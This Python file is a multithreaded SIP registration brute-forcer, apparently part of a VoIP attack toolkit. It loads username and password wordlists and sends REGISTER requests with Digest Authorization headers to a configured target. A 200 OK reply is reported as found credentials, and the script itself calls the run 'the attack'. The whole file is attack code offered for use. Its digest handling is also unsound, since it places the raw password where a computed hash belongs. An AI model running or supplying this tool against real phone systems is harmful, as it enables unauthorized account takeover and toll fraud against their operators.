import socket
import random
import string
import threading
import os
import sys
from collections import defaultdict
from tqdm import tqdm
import termios
import tty
import select
from concurrent.futures import ThreadPoolExecutor, as_completed

# Add the functions directory to the Python path
sys.path.append(os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'functions'))

# Import functions
from func import get_local_ip, create_sip_message, generate_call_id
from config_parser import ConfigParser

class SipRegistrationScanner:
    def __init__(self, target_ip=None, port=5060, threads=10, verbose=0):
        self.target_ip = target_ip
        self.port = port
        self.threads = threads
        self.verbose = verbose
        self.results = defaultdict(list)
        self.results_lock = threading.Lock()
        self.print_lock = threading.Lock()
        self.local_ip = get_local_ip()
        
        # Additional SIP parameters
        self.from_user = "2000"
        self.to_user = "1000"
        self.from_ip = ""
        self.user_agent = "Theta/1.0"
        self.username_wordlist = ""
        self.password_wordlist = ""
        
        # Load configuration
        self.load_config()
        self.exit_event = threading.Event()  # Add this for stopping the scan

    def load_config(self):
        """Load configuration from config file"""
        config_path = os.path.join(os.path.dirname(__file__), 'config', 'config.txt')
        try:
            config_parser = ConfigParser(config_path)
            config = config_parser.parse()
            
            # Update instance attributes with config values if they exist
            self.target_ip = config.get('target_ip', self.target_ip)
            self.port = config_parser.get_int('port', self.port)
            self.threads = config_parser.get_int('threads', self.threads)
            self.verbose = config_parser.get_int('verbose', self.verbose)
            
            # Load SIP-specific configurations
            self.from_user = config.get('from_user', self.from_user)
            self.to_user = config.get('to_user', self.to_user)
            self.from_ip = config.get('from_ip', self.from_ip)
            self.user_agent = config.get('user_agent', self.user_agent)
            
            # Load wordlist paths
            self.username_wordlist = config.get('username_wordlist', '')
            self.password_wordlist = config.get('password_wordlist', '')
            
            if self.verbose >= 1:
                print("Configuration loaded successfully")
        except Exception as e:
            print(f"Using default configuration: {str(e)}")

    def read_wordlist(self, filename):
        """Read a wordlist from a file."""
        if not filename:
            return []
            
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except UnicodeDecodeError:
            # Fallback to latin-1 if UTF-8 fails
            with open(filename, 'r', encoding='latin-1') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"Error reading wordlist {filename}: {str(e)}")
            return []

    def try_register(self, username, password):
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)  # 2 second timeout
            
            # Generate a random local port
            local_port = random.randint(20000, 65535)
            sock.bind(('0.0.0.0', local_port))
            
            # Generate call ID
            call_id = generate_call_id(None)
            
            # Use from_ip if specified, otherwise use local_ip
            source_ip = self.from_ip if self.from_ip else self.local_ip
            
            # Create REGISTER message with authentication
            # Use the username being tested as the to_user
            message = create_sip_message(
                'REGISTER',
                self.target_ip,
                source_ip,
                local_port,
                call_id,
                self.user_agent,
                from_user=self.from_user,
                to_user=username  # Use the username being tested
            )
            
            # Add authentication headers
            auth_headers = f"""Authorization: Digest username="{username}",realm="{self.target_ip}",nonce="{call_id}",uri="sip:{self.target_ip}",response="{password}",algorithm=MD5\r\n"""
            
            # Insert auth headers before Content-Length
            message = message.replace("Content-Length: 0\r\n", f"{auth_headers}Content-Length: 0\r\n")
            
            # Send REGISTER request
            sock.sendto(message.encode(), (self.target_ip, self.port))
            
            # Wait for response
            try:
                data, addr = sock.recvfrom(4096)
                response = data.decode()
                
                if "200 OK" in response:
                    with self.print_lock:
                        print(f"\n[+] Success! Found credentials - Username: {username} Password: {password}")
                    return True
                elif "401 Unauthorized" in response:
                    if self.verbose >= 2:
                        print(f"[-] Failed: {username}:{password}")
                    return False
                
            except socket.timeout:
                if self.verbose >= 2:
                    print(f"[-] Timeout: {username}:{password}")
                return False
                
        except Exception as e:
            if self.verbose >= 2:
                print(f"Error trying {username}:{password} - {str(e)}")
            return False
        finally:
            if sock:
                sock.close()

    def get_key(self):
        """Get a single keypress from the terminal."""
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        try:
            tty.setraw(sys.stdin.fileno())
            if select.select([sys.stdin], [], [], 0.1)[0]:
                key = sys.stdin.read(1)
                return key
            return None
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)

    def check_for_space_stop(self):
        """Check if space bar was pressed to stop the scan"""
        key = self.get_key()
        if key == ' ':  # Space bar
            return True
        return False

    def try_register_threaded(self, username, password, pbar):
        """Threaded version of try_register"""
        result = self.try_register(username, password)
        with self.results_lock:
            pbar.update(1)
        return result

    def start_scan(self, username_wordlist=None, password_wordlist=None):
        """Start the registration scanning process with threading"""
        username_wordlist = username_wordlist or self.username_wordlist
        password_wordlist = password_wordlist or self.password_wordlist
        
        if not username_wordlist or not password_wordlist:
            print("Error: No wordlists specified")
            return False
        
        usernames = self.read_wordlist(username_wordlist)
        passwords = self.read_wordlist(password_wordlist)
        
        if not usernames or not passwords:
            print("Error: Empty wordlist(s)")
            return False
            
        print(f"\nLoaded {len(usernames)} usernames and {len(passwords)} passwords")
        print(f"Starting registration attempts against {self.target_ip}:{self.port}")
        print("Press SPACE to stop the attack")
        
        total_attempts = len(usernames) * len(passwords)
        self.exit_event.clear()
        
        with tqdm(total=total_attempts, desc="Testing credentials") as pbar:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                
                for password in passwords:
                    if self.exit_event.is_set():
                        break
                        
                    for username in usernames:
                        if self.exit_event.is_set():
                            break
                            
                        # Check for space bar press
                        if self.check_for_space_stop():
                            print("\nStopping scan...")
                            self.exit_event.set()
                            break
                        
                        future = executor.submit(self.try_register_threaded, username, password, pbar)
                        futures.append(future)
                
                # Wait for completion or stop
                try:
                    for future in as_completed(futures):
                        if future.result():  # If credentials found
                            self.exit_event.set()
                            return True
                        
                        if self.exit_event.is_set():
                            break
                except KeyboardInterrupt:
                    self.exit_event.set()
                    print("\nStopping scan...")
        
        if self.exit_event.is_set():
            print("\nScan stopped by user")
        else:
            print("\nNo valid credentials found")
        
        return False

def main():
    """Main function to run the SIP registration scanner"""
    print("\n=== SIP Registration Scanner ===")
    print("------------------------------")
    
    # Create scanner instance with config
    scanner = SipRegistrationScanner()
    
    # Verify required config values are present
    if not scanner.target_ip:
        print("Error: target_ip not specified in config file")
        input("\nPress Enter to return to main menu...")
        return
        
    if not scanner.username_wordlist or not scanner.password_wordlist:
        print("Error: wordlist paths not specified in config file")
        input("\nPress Enter to return to main menu...")
        return
    
    print("\nConfiguration loaded:")
    print(f"Target: {scanner.target_ip}:{scanner.port}")
    print(f"Username wordlist: {scanner.username_wordlist}")
    print(f"Password wordlist: {scanner.password_wordlist}")
    print(f"Threads: {scanner.threads}")
    print("\nPress Enter to start the attack (SPACE to stop once started)...")
    input()
    
    try:
        scanner.start_scan()
    except KeyboardInterrupt:
        print("\nScan interrupted by user")
    except Exception as e:
        print(f"\nError during scan: {str(e)}")
    
    input("\nPress Enter to return to main menu...")

if __name__ == "__main__":
    main()
